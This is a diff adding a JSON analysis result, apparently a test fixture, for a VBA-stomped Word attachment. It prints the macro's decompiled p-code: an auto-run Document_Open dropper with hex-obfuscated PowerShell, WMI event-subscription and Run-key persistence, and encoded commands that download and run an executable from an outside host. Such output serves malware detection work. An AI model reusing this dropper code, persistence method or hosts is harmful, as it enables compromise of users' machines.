@@ -1,0 +1,316 @@
+{
+  "form": 1,
+  "observables": {
+    "file:1b64a7354e519be9704767a735fc623c0eff61205ab257fb75985ab648a2c4b2": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_stomped.docm.extracted/[Content_Types].xml": {}
+      },
+      "redirection": "file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e",
+      "relationships": {
+        "extracted_from file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text, with very long lines (348), with no line terminators"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text, with very long lines (348), with no line terminators (text/xml)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:29114363f749a0226b6988dda3ca2492a954117ab6b5f382706c20300dabc079": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_stomped.docm.extracted/word/document.xml": {}
+      },
+      "redirection": "file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e",
+      "relationships": {
+        "extracted_from file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with no line terminators"
+          },
+          "summary": "File Type Analysis: ASCII text, with no line terminators (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "vba_stomped.docm": {
+          "type=email.attachment": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "archive": {
+          "details": {
+            "extracted_files": [
+              "[Content_Types].xml",
+              "word/document.xml",
+              "word/vbaProject.bin",
+              "_rels/.rels"
+            ],
+            "extraction_error": null,
+            "file_count": 4
+          },
+          "summary": "Archive Analysis: extracted 4 of 4 files: ([Content_Types].xml, word/document.xml, word/vbaProject.bin, _rels/.rels)",
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": true,
+            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            "type": "Microsoft Word 2007+"
+          },
+          "summary": "File Type Analysis: Microsoft Word 2007+ (application/vnd.openxmlformats-officedocument.wordprocessingml.document) (ms office document) (zip archive)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "suspicious": 1
+            },
+            "macros": [],
+            "type": "OpenXML"
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "pcodedmp": {
+          "details": {
+            "line_count": 435
+          },
+          "summary": "PCode Analysis: decoded 435 lines",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "zip": true
+      }
+    },
+    "file:d48362a271ab0d281b21b0968d4efa025c683c1805e9b46cb2ed67207f38a33d": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "vba_stomped.docm.extracted/word/vbaProject.bin.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:fbc9567b0deadf45ce1265c2620d702dcecde8a9db8473ba88af9059cf18d1ce",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with very long lines (697)"
+          },
+          "summary": "File Type Analysis: ASCII text, with very long lines (697) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:d91fa571c7e58d33e48db1a3dcb270c137acf6a9ec1cb6d447f3b8890e1574df": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_stomped.docm.extracted/_rels/.rels": {}
+      },
+      "redirection": "file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e",
+      "relationships": {
+        "extracted_from file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text, with no line terminators"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text, with no line terminators (text/xml)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:fbc9567b0deadf45ce1265c2620d702dcecde8a9db8473ba88af9059cf18d1ce": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_stomped.docm.extracted/word/vbaProject.bin": {}
+      },
+      "redirection": "file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e",
+      "relationships": {
+        "extracted_from file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": false,
+            "is_ole_file": true,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/x-ole-storage",
+            "type": "Composite Document File V2 Document, Cannot read section info"
+          },
+          "summary": "File Type Analysis: Composite Document File V2 Document, Cannot read section info (application/x-ole-storage) (ms office document) (ole compound file)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "hex string": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "VBA P-code",
+                "local_path": "d48362a271ab0d281b21b0968d4efa025c683c1805e9b46cb2ed67207f38a33d",
+                "stream_path": "VBA P-code",
+                "vba_code": "' Processing file: <root>/files/vba_stomped.docm.extracted/word/vbaProject.bin\n' ===============================================================================\n' Module streams:\n' VBA/ThisDocument - 11073 bytes\n' Line #0:\n' \tDim (Const) \n' \tLitDI2 0x0002 \n' \tVarDefn wnjnkjzuvm\n' Line #1:\n' \tDim (Const) \n' \tLitDI2 0x0001 \n' \tVarDefn oulsbdhnui\n' Line #2:\n' \tDim (Const) \n' \tLitDI2 0x0000 \n' \tVarDefn kdxxgwqvzi\n' Line #3:\n' \tFuncDefn (Sub Document_Open())\n' Line #4:\n' \tLitStr 0x00B2 \"706f7765727368656c6c202d6e6f50202d737461202d772031202d656e632063774273414755415a514277414341414d774177414441414f77424a4147344164674276414773415a514174414663415a514269414649415a51\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x013C \"4278414855415a51427a414851414941426f414851416441427741484d414f674176414338416541427a41475541654142774147384163674275414738414c67426a4147774164514269414338414f41426941486f415a41416741433041547742314148514152674270414777415a514167414351415a514275414859414f67423041475541625142774146774161514178414334415a51423441475541\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0024 \"57696e646f7773536f667477617265557064\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x000A \"6174657231\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tArgsCall odhqmqfrpbeitdpnqt 0x0002 \n' Line #5:\n' \tLitStr 0x0002 \"70\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x00EC \"6f7765727368656c6c202d6e6f50202d737461202d772031202d656e632063774273414755415a514277414341414e414177414441414f77427a414745416341427a414341414967416b414755416267423241446f416441426c414730416341426341476b414d514175414755416541426c41434941\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x001C \"57696e646f7773536f6674776172\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0012 \"655570646174657232\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tArgsCall odhqmqfrpbeitdpnqt 0x0002 \n' Line #6:\n' \tEndSub \n' Line #7:\n' \tFuncDefn (Public Function nnkxasxmgkzxc(ByVal btgbbxojdajov As String) As Boolean)\n' Line #8:\n' \tDim \n' \tVarDefn filterName\n' \tVarDefn lzcgbinwymuvzcgugox (As String)\n' Line #9:\n' \tDim \n' \tVarDefn cttxucgpri\n' \tVarDefn qoxqsmabsc\n' Line #10:\n' \tDim \n' \tVarDefn vneojnwlwvaxw\n' \tVarDefn wmyrkpfbdhyrflpeayp\n' \tVarDefn xvholaopxom\n' Line #11:\n' \tDim \n' \tVarDefn uhrcqkzgjkyaj\n' \tVarDefn vouyyrwslruhsxf\n' \tVarDefn jxdtzxpgmvaijfjxfn\n' Line #12:\n' \tOnError Failed \n' Line #13:\n' \tLd olhfadbpwjmxcxgpd \n' \tLitStr 0x0002 \"45\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0008 \"76656e74\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tSt filterName \n' Line #14:\n' \tLd olhfadbpwjmxcxgpd \n' \tLitStr 0x0006 \"436f6e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x000A \"73756d6572\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tSt lzcgbinwymuvzcgugox \n' Line #15:\n' \tSetStmt \n' \tLitStr 0x0020 \"5762656d536372697074696e672e5357\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0014 \"62656d4c6f6361746f72\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tArgsLd CreateObject 0x0001 \n' \tSet cttxucgpri \n' Line #16:\n' \tSetStmt \n' \tLitStr 0x0002 \"2e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0016 \"726f6f745c737562736372\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x000C \"697074696f6e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLd cttxucgpri \n' \tArgsMemLd ConnectServer 0x0002 \n' \tSet qoxqsmabsc \n' Line #17:\n' \tSetStmt \n' \tLitStr 0x0004 \"5f5f\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0016 \"4576656e7446696c746572\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLd qoxqsmabsc \n' \tArgsMemLd Get 0x0001 \n' \tSet vneojnwlwvaxw \n' Line #18:\n' \tLineCont 0x000C 0B 00 00 00 15 00 00 00 1F 00 00 00\n' \tLitStr 0x0052 \"53454c454354202a2046524f4d205f5f496e7374616e63654d6f64696669636174696f6e4576656e74\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0016 \"2057495448494e20363020\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x002C \"574845524520546172676574496e7374616e63652049\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0056 \"5341202757696e33325f50657266466f726d6174746564446174615f506572664f535f53797374656d2720\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0042 \"414e4420546172676574496e7374616e63652e53797374656d557054696d65203e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0014 \"3d2032303020414e4420\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x000C \"546172676574\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0036 \"496e7374616e63652e53797374656d557054696d65203c20333230\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tSt Query \n' Line #19:\n' \tSetStmt \n' \tLd vneojnwlwvaxw \n' \tMemLd Spawninstance_ \n' \tSet uhrcqkzgjkyaj \n' Line #20:\n' \tLd filterName \n' \tLd uhrcqkzgjkyaj \n' \tMemSt Name \n' Line #21:\n' \tLitStr 0x0004 \"726f\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0010 \"6f745c63696d7632\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLd uhrcqkzgjkyaj \n' \tMemSt eventNamespace \n' Line #22:\n' \tLitStr 0x0006 \"57514c\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLd uhrcqkzgjkyaj \n' \tMemSt QueryLanguage \n' Line #23:\n' \tLd Query \n' \tLd uhrcqkzgjkyaj \n' \tMemSt Query \n' Line #24:\n' \tLd uhrcqkzgjkyaj \n' \tArgsMemCall Put_ 0x0000 \n' Line #25:\n' \tSetStmt \n' \tLitStr 0x0010 \"436f6d6d616e644c\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0020 \"696e654576656e74436f6e73756d6572\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLd qoxqsmabsc \n' \tArgsMemLd Get 0x0001 \n' \tSet wmyrkpfbdhyrflpeayp \n' Line #26:\n' \tSetStmt \n' \tLd wmyrkpfbdhyrflpeayp \n' \tMemLd Spawninstance_ \n' \tSet vouyyrwslruhsxf \n' Line #27:\n' \tLd lzcgbinwymuvzcgugox \n' \tLd vouyyrwslruhsxf \n' \tMemSt Name \n' Line #28:\n' \tLd btgbbxojdajov \n' \tLd vouyyrwslruhsxf \n' \tMemSt CommandLineTemplate \n' Line #29:\n' \tLd vouyyrwslruhsxf \n' \tArgsMemCall Put_ 0x0000 \n' Line #30:\n' \tSetStmt \n' \tLitStr 0x0010 \"5f5f46696c746572\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0022 \"546f436f6e73756d657242696e64696e67\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLd qoxqsmabsc \n' \tArgsMemLd Get 0x0001 \n' \tSet xvholaopxom \n' Line #31:\n' \tSetStmt \n' \tLd xvholaopxom \n' \tMemLd Spawninstance_ \n' \tSet jxdtzxpgmvaijfjxfn \n' Line #32:\n' \tLitStr 0x0014 \"__EventFilter.Name=\"\"\n' \tLd filterName \n' \tConcat \n' \tLitStr 0x0001 \"\"\"\n' \tConcat \n' \tLd jxdtzxpgmvaijfjxfn \n' \tMemSt Filter \n' Line #33:\n' \tLitStr 0x001F \"CommandLineEventConsumer.Name=\"\"\n' \tLd lzcgbinwymuvzcgugox \n' \tConcat \n' \tLitStr 0x0001 \"\"\"\n' \tConcat \n' \tLd jxdtzxpgmvaijfjxfn \n' \tMemSt Consumer \n' Line #34:\n' \tLd jxdtzxpgmvaijfjxfn \n' \tArgsMemCall Put_ 0x0000 \n' Line #35:\n' \tLitVarSpecial (True)\n' \tSt nnkxasxmgkzxc \n' Line #36:\n' \tExitFunc \n' Line #37:\n' \tLabel Failed \n' Line #38:\n' \tLitVarSpecial (False)\n' \tSt nnkxasxmgkzxc \n' Line #39:\n' \tEndFunc \n' Line #40:\n' \tFuncDefn (Public Function ieawcjfoaskhnrksmmhk(ByVal btgbbxojdajov As String) As Boolean)\n' Line #41:\n' \tOnError Failed \n' Line #42:\n' \tDim (Const) \n' \tLitHI4 0x0001 0x8000 \n' \tVarDefn HKEY_CURRENT_USER\n' Line #43:\n' \tLitStr 0x0002 \"53\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0058 \"6f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tSt strKeyPath \n' Line #44:\n' \tLitStr 0x0002 \"2e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tSt strComputer \n' Line #45:\n' \tSetStmt \n' \tLitStr 0x0032 \"77696e6d676d74733a7b696d706572736f6e6174696f6e4c65\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0026 \"76656c3d696d706572736f6e6174657d215c5c\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLd strComputer \n' \tConcat \n' \tLitStr 0x000C \"5c726f6f745c\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0024 \"64656661756c743a53746452656750726f76\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tArgsLd GetObject 0x0001 \n' \tSet hppqcwcwciltohggt \n' Line #46:\n' \tLd olhfadbpwjmxcxgpd \n' \tSt strValueName \n' Line #47:\n' \tLd btgbbxojdajov \n' \tSt strValue \n' Line #48:\n' \tLd HKEY_CURRENT_USER \n' \tLd strKeyPath \n' \tLd strValueName \n' \tLd strValue \n' \tLd hppqcwcwciltohggt \n' \tArgsMemCall SetExpandedStringValue 0x0004 \n' Line #49:\n' \tLitVarSpecial (True)\n' \tSt ieawcjfoaskhnrksmmhk \n' Line #50:\n' \tExitFunc \n' Line #51:\n' \tLabel Failed \n' Line #52:\n' \tLitVarSpecial (False)\n' \tSt ieawcjfoaskhnrksmmhk \n' Line #53:\n' \tEndFunc \n' Line #54:\n' \tFuncDefn (Public Function odhqmqfrpbeitdpnqt(ByVal btgbbxojdajov As String) As Boolean)\n' Line #55:\n' \tLd btgbbxojdajov \n' \tLd olhfadbpwjmxcxgpd \n' \tArgsLd nnkxasxmgkzxc 0x0002 \n' \tLitVarSpecial (True)\n' \tNe \n' \tIfBlock \n' Line #56:\n' \tLd btgbbxojdajov \n' \tLd olhfadbpwjmxcxgpd \n' \tArgsCall ieawcjfoaskhnrksmmhk 0x0002 \n' Line #57:\n' \tEndIfBlock \n' Line #58:\n' \tArgsCall bhyyuwjdsaubzgkzqb 0x0000 \n' Line #59:\n' \tEndFunc \n' Line #60:\n' \tFuncDefn (Public Function bhyyuwjdsaubzgkzqb(id_FFFE As Variant))\n' Line #61:\n' \tOnError Ersr \n' Line #62:\n' \tSetStmt \n' \tLitStr 0x0002 \"57\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0004 \"5363\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"726970\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"742e53\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0004 \"6865\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0004 \"6c6c\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tArgsLd CreateObject 0x0001 \n' \tSet jpgwdcjerskbupfdyr \n' Line #63:\n' \tDim \n' \tVarDefn pt\n' Line #64:\n' \tDim \n' \tVarDefn sh\n' Line #65:\n' \tDim \n' \tVarDefn bars\n' Line #66:\n' \tDim \n' \tVarDefn cod\n' Line #67:\n' \tDim \n' \tVarDefn cod2\n' Line #68:\n' \tLitStr 0x02A6 \"dAByAHkAIAB7ACQAdwBDACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGkAbgBIAHQAdABwACIAKQA7ACQAbABuAGsAIAA9ACAAIgBoAHQAdABwACIAIAArACAAIgBzADoALwAvAHMAZQB4AGMAcgBhAGYAdAAuAGMAbAB1AGIALwA2ADMANgAxADYAZQAiACAAKwAgACIANgA5ADcANwA3ADIAIgAgACsAIAAiADcAOQA2ADUANwA1ADYAYwAiACAAKwAgACIANgAyADcAOQAzADgAMwAyADMAOAAzADcAIgAgACsAIAAiADMANAA2ADMANwA3ADYAMQAzADgAMwAiACAAKwAgACIAOAAzADgALwBhAGIAYwAiACAAKwAgACIAZABlADUANAAzADIAIgAgACsAIAAiADEAYQBiAGMAZABlACIAIAArACAAIgAxADIAMwA0ADUAIgA7ACQAdwBDAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAGwAbgBrACwAIgAkAGUAbgB2AD\"\n' \tLitStr 0x0039 \"oAdABlAG0AcABcADIAMgA0AC4AZQB4AGUAIgApADsAcwBhAHAAcwAgACI\"\n' \tConcat \n' \tSt cod \n' Line #69:\n' \tLitStr 0x0097 \"AJABlAG4AdgA6AHQAZQBtAHAAXAAyADIANAAuAGUAeABlACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAOwAkAGwAbgBrAHAAcgAgAD0AIAAiAGgAdAB0ACIAIAArACAAIgBwAH\"\n' \tLitStr 0x01EA \"MAOgAvAC8AcwBlAHgAYwByAGEAZgB0AC4AYwBsAHUAYgAvADMAOAA3ADEAMwA1ADYANgAzACIAIAArACAAIgA3ADMANQA3ADAAMwAyADMAMwA2ADMAMwA1ACIAIAArACAAIgA2AGUAMwA4ADMANQAzADIANgBlADcAMAA3ADYANgA2ADYAIgAgACsAIAAiAGYANgAxADMAMwA3ADcAMwA1ADMAOAA2AGUALwBwAHMAcwBhAHcAOQAzADcAIgAgACsAIAAiADMANQBtAGkAeQBwAHMALwAiADsAJAB3AEMALgBIAEUAQQBkAGUAcgBTAC4AQQBkAGQAKAAiAFUAcwBlAHIALQBBAGcAZQBuAHQAIgAsACIAVwBpAG4ASAB0AHQAcAAiACkAOwAkAHcAQwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAbABuAGsAcAByACkAOwB9AGMAYQB0AGMAaAB7AH0A\"\n' \tConcat \n' \tSt cod2 \n' Line #70:\n' \tLitStr 0x0002 \"70\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0002 \"6f\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"776572\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tSt pt \n' Line #71:\n' \tLitStr 0x0002 \"73\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0004 \"6865\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0004 \"6c6c\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tSt sh \n' Line #72:\n' \tLitStr 0x0004 \"202d\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tLitStr 0x0006 \"457865\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0002 \"63\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0008 \"7574696f\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0002 \"6e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"506f6c\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0008 \"69637920\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0002 \"62\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0004 \"7970\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0004 \"6173\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0008 \"73202d6e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0004 \"6f70\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"726f66\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"696c65\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0004 \"202d\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"77696e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0002 \"64\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0008 \"6f777374\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0008 \"796c6520\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0002 \"68\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0002 \"69\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"646465\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0006 \"6e202d\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0002 \"65\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0002 \"6e\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tLitStr 0x0004 \"6320\"\n' \tArgsLd asalvxeqskzr 0x0001 \n' \tConcat \n' \tSt bars \n' Line #73:\n' \tLd pt \n' \tLd sh \n' \tConcat \n' \tLd bars \n' \tConcat \n' \tLd cod \n' \tConcat \n' \tLd cod2 \n' \tConcat \n' \tLitDI2 0x0000 \n' \tLd jpgwdcjerskbupfdyr \n' \tArgsMemCall Run 0x0002 \n' Line #74:\n' \tLabel Ersr \n' Line #75:\n' \tEndFunc \n' Line #76:\n' \tFuncDefn (Function asalvxeqskzr(ByVal msybfiemglor As String) As String)\n' Line #77:\n' \tDim \n' \tVarDefn uqrmfktnkywt (As Long)\n' Line #78:\n' \tStartForVariable \n' \tLd uqrmfktnkywt \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd msybfiemglor \n' \tFnLen \n' \tLitDI2 0x0002 \n' \tForStep \n' Line #79:\n' \tLd asalvxeqskzr \n' \tLitStr 0x0002 \"&H\"\n' \tLd msybfiemglor \n' \tLd uqrmfktnkywt \n' \tLitDI2 0x0002 \n' \tArgsLd Mid$ 0x0003 \n' \tConcat \n' \tArgsLd Val 0x0001 \n' \tArgsLd Chr$ 0x0001 \n' \tConcat \n' \tSt asalvxeqskzr \n' Line #80:\n' \tStartForVariable \n' \tLd uqrmfktnkywt \n' \tEndForVariable \n' \tNextVar \n' Line #81:\n' \tEndFunc \n' Line #82:\n' Line #83:",
+                "vba_filename": "VBA_P-code.txt"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (1 macro files) (OLE) | autoexec=1, suspicious=1, hex string=1",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "ole": true,
+        "olevba": true
+      }
+    },
+    "file:fe0957024595307c9b083effc3231498bc7b7945d28bc1d5aa6d97d9e0729c25": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "vba_stomped.docm.pcode.bas": {
+          "type=script.vbscript": true
+        }
+      },
+      "redirection": "file:9317501fcf3e1f4d13c4396777ed2da61133e409911f15c8c5e705787ad36c8e",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with very long lines (695)"
+          },
+          "summary": "File Type Analysis: ASCII text, with very long lines (695) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    }
+  }
+}
